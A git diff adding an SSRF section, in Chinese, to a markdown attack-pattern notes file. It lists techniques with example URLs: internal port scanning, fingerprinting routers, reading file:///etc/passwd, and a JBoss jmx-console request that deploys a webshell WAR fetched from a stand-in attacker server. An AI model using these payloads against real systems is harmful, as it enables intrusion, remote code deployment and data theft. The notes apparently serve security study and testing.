@@ -1,5 +1,21 @@
 # attack_pattern
 
+## SSRF
+
+> 所有场景都可攻击 **内网** 或 **本地**
+
+1. 请求非http服务的端口
+    - 返回banner信息，如：`http://scanme.nmap.org:22/test.txt`返回OpenSSH版本, `http://127.0.0.1:3306/test.txt`返回MySQL版本.
+    - 探测端口开放状态, 如请求关闭的端口: `http://scanme.nmap.org:25/test.txt`报错.
+1. 正则表达式攻击造成应用程序溢出
+    - 如果`9876`端口开放, 构造`http://127.0.0.1:9876/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`使进程崩溃.
+1. 通过访问默认文件, 识别应用
+    - `http://10.0.0.1/portName.js`可以根据返回结果判断是否是 Dlink 路由器.
+1. 访问内网web应用, 构造GET参数实现命令注入, SQL注入, 部署webshell等.
+    - `http://127.0.0.1/jmx-console/?name=jboss.system:service=MainDeployer&methodIndex=17&{==arg0=http://our_public_internet_server/utils/cmd.war==}`
+1. 请求非http协议, 读取本地文件, 如: `file:///etc/passwd`。
+1. 间接获取内置帐号token。
+
 ## SQL注入
 
 ### JDBC
